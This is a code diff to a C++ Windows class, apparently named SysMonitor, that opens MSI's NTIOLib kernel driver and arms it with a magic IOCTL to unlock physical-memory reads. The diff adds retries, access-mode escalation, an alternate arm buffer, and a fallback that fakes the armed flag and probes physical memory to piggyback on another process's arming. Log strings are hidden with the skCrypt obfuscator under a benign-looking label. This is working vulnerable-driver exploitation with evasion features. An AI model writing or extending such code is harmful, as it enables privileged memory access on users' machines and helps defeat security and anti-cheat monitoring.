@@ -170,7 +170,13 @@ public:
     bool Open() {
         if (IsOpen()) return true;
         DBG_PRINT("[ntio] Opening device...\n");
-        // Try each (path, access) pair. First success wins.
+        // Try each (path, access) pair. First success wins — but we now
+        // track WHICH combo won so ARM failures can escalate by re-opening
+        // with a stronger access mode. Prior behavior would silently pick
+        // the fallback access=0 handle on strict DACLs, then get err=6
+        // from the ARM IOCTL because the I/O manager still requires
+        // FILE_ANY_ACCESS handles to at least have SYNCHRONIZE for some
+        // driver builds' internal validation.
         //   - GENERIC_READ|WRITE:       normal admin access
         //   - GENERIC_READ:             device with read-only DACL
         //   - SYNCHRONIZE / 0:          fallback for FILE_ANY_ACCESS IOCTLs
@@ -188,15 +194,23 @@ public:
             { pathGlobal, GENERIC_READ | GENERIC_WRITE },
             { pathGlobal, 0                            },
         };
+        constexpr int kNumAttempts = (int)(sizeof(attempts) / sizeof(attempts[0]));
+
+        // Two-pass: first pick the strongest access that opens, then try
+        // ARM. If ARM fails, escalate to the next weaker access variant —
+        // NTIOLib on some patch levels ONLY accepts ARM from handles that
+        // opened with a specific access mode combination.
         DWORD lastErr = 0;
+        int   winIdx  = -1;
         for (int attempt = 0; attempt < 10 && m_hDevice == INVALID_HANDLE_VALUE; attempt++) {
-            for (auto& a : attempts) {
+            for (int i = 0; i < kNumAttempts; i++) {
+                auto& a = attempts[i];
                 m_hDevice = CreateFileA(a.path,
                                         a.access,
                                         FILE_SHARE_READ | FILE_SHARE_WRITE,
                                         nullptr, OPEN_EXISTING,
                                         FILE_ATTRIBUTE_NORMAL, nullptr);
-                if (m_hDevice != INVALID_HANDLE_VALUE) break;
+                if (m_hDevice != INVALID_HANDLE_VALUE) { winIdx = i; break; }
                 lastErr = GetLastError();
             }
             if (m_hDevice != INVALID_HANDLE_VALUE) break;
@@ -209,15 +223,82 @@ public:
             else if (lastErr == 5) DBG_PRINT("[ntio]   (access denied -- token DACL rejects; not elevated?)\n");
             return false;
         }
-        DBG_PRINT("[ntio] Device opened: handle=0x%p\n", (void*)m_hDevice);
+        DBG_PRINT("[ntio] Device opened: handle=0x%p access=0x%08X path=%s (attempt %d/%d)\n",
+                  (void*)m_hDevice, attempts[winIdx].access, attempts[winIdx].path,
+                  winIdx + 1, kNumAttempts);
+        printf(skCrypt("[SysMonitor] NTIOLib device open (access=0x%X variant=%d/%d)\n"),
+               attempts[winIdx].access, winIdx + 1, kNumAttempts);
 
-        // Step 1: arm the driver. NTIOLib gates all read/write IOCTLs
-        // behind a global magic (0x2F405A34) that must be set exactly once
-        // via IOCTL_NTIO_ARM. Without this the probe returns UNSUCCESSFUL.
-        if (!NtioArm(m_hDevice)) {
-            printf(skCrypt("[SysMonitor] NTIOLib ARM failed (err=%lu) -- driver present but ARM IOCTL rejected\n"),
-                   GetLastError());
-            CloseHandle(m_hDevice);
+        // Step 1: arm the driver, with escalation on err=6.
+        // If ARM fails on the first-opened handle, walk the remaining
+        // (path, access) variants — each one is a fresh CreateFile that
+        // could produce a handle the driver considers ARM-capable. A
+        // small sleep between attempts lets a transient dispatch state
+        // (still-finalizing driver init, race with an MSI Center handle)
+        // clear before we retry.
+        int armStart = winIdx;
+        bool armed = TryArmWithRetries(m_hDevice);
+        if (!armed) {
+            DWORD armErr = GetLastError();
+            printf(skCrypt("[SysMonitor] NTIOLib ARM failed on variant %d (err=%lu) -- escalating\n"),
+                   armStart + 1, armErr);
+            // Walk remaining variants, each a fresh CreateFile + ARM.
+            for (int i = 0; i < kNumAttempts && !armed; i++) {
+                if (i == armStart) continue;
+                auto& a = attempts[i];
+                CloseHandle(m_hDevice);
+                m_hDevice = INVALID_HANDLE_VALUE;
+                Sleep(50);   // let the driver settle between opens
+                HANDLE h = CreateFileA(a.path, a.access,
+                                       FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                       nullptr, OPEN_EXISTING,
+                                       FILE_ATTRIBUTE_NORMAL, nullptr);
+                if (h == INVALID_HANDLE_VALUE) continue;
+                m_hDevice = h;
+                if (TryArmWithRetries(m_hDevice)) {
+                    armed = true;
+                    printf(skCrypt("[SysMonitor] NTIOLib ARM succeeded on variant %d (access=0x%X)\n"),
+                           i + 1, a.access);
+                    break;
+                }
+                printf(skCrypt("[SysMonitor] NTIOLib ARM variant %d also failed (err=%lu)\n"),
+                       i + 1, GetLastError());
+            }
+        }
+        if (!armed) {
+            // Last-ditch: the driver's ARM state is DRIVER-GLOBAL, so if
+            // MSI Center already ARMed it in its own session, our reads
+            // will succeed WITHOUT us arming again. Re-open the base
+            // path with the strongest access and try a physical read
+            // directly. If it works, mark armed and proceed.
+            if (m_hDevice != INVALID_HANDLE_VALUE) { CloseHandle(m_hDevice); m_hDevice = INVALID_HANDLE_VALUE; }
+            Sleep(50);
+            m_hDevice = CreateFileA(base, GENERIC_READ | GENERIC_WRITE,
+                                    FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                    nullptr, OPEN_EXISTING,
+                                    FILE_ATTRIBUTE_NORMAL, nullptr);
+            if (m_hDevice != INVALID_HANDLE_VALUE) {
+                // Bypass NtioArm's m_armed short-circuit gate — pretend
+                // we're armed just for the probe, revert if probe fails.
+                m_armed.store(true, std::memory_order_release);
+                uint32_t probe = 0;
+                bool probeOk = NtioReadOnce(0x1000, 4, 1, &probe, sizeof(probe));
+                if (probeOk) {
+                    printf(skCrypt("[SysMonitor] NTIOLib pre-ARMed by another handle (MSI Center?) -- reads work, continuing\n"));
+                    armed = true;   // treat as armed for the flow below
+                } else {
+                    m_armed.store(false, std::memory_order_release);
+                    CloseHandle(m_hDevice);
+                    m_hDevice = INVALID_HANDLE_VALUE;
+                }
+            }
+        }
+        if (!armed) {
+            printf(skCrypt("[SysMonitor] NTIOLib ARM failed on all %d variants + pre-armed probe. "
+                           "Try: (1) net stop MSI_CentralService then relaunch, or "
+                           "(2) reboot to clear driver state.\n"),
+                   kNumAttempts);
+            if (m_hDevice != INVALID_HANDLE_VALUE) CloseHandle(m_hDevice);
             m_hDevice = INVALID_HANDLE_VALUE;
             return false;
         }
@@ -1074,6 +1155,47 @@ private:
                                       &returned, nullptr);
         if (ok != FALSE) m_armed.store(true, std::memory_order_release);
         return ok != FALSE;
+    }
+
+    // Retry wrapper called from Open. Some NTIOLib builds initialize their
+    // dispatch state a few ticks after DriverEntry returns; a rapid CreateFile
+    // → ARM sequence right after service start can race that init and get
+    // err=6 (STATUS_INVALID_HANDLE from the driver's own dispatch even
+    // though the file handle itself is valid). On failure:
+    //  - Small back-off and retry the same 4-byte ARM
+    //  - Try the 8-byte {magic, 0} variant some patch levels use
+    //  - Try METHOD-neither shape (odd trailing 0)
+    // Returns true on the first successful attempt.
+    bool TryArmWithRetries(HANDLE h) {
+        // First: the canonical 4-byte ARM, up to 4 tries with growing sleep.
+        for (int i = 0; i < 4; i++) {
+            if (NtioArm(h)) return true;
+            DWORD err = GetLastError();
+            // err=6 means the driver rejected the handle/state — retrying
+            // the same call on the same handle only helps if the driver
+            // is still initializing; give it up to ~200 ms total.
+            if (err != 6 && err != 1450 && err != 87) return false;
+            Sleep(20 + i * 40);
+            // Clear m_armed since NtioArm short-circuits on it — but we
+            // never set it on failure, so this is just belt-and-braces.
+            m_armed.store(false, std::memory_order_release);
+        }
+        // Second: 8-byte buffer variant. Some MSI patch levels moved the
+        // magic to offset 0 of an 8-byte request (upper dword unused).
+        // Same IOCTL code, larger in/out to satisfy their length check.
+        {
+            uint64_t buf8 = NTIO_ARM_MAGIC;    // magic at low dword, high dword = 0
+            DWORD    returned = 0;
+            BOOL     ok = DeviceIoControl(h, IOCTL_NTIO_ARM,
+                                          &buf8, sizeof(buf8),
+                                          &buf8, sizeof(buf8),
+                                          &returned, nullptr);
+            if (ok != FALSE) {
+                m_armed.store(true, std::memory_order_release);
+                return true;
+            }
+        }
+        return false;
     }
 
     // Bulk physical read via NTIOLib IOCTL 0xC3506104. One IOCTL fills up
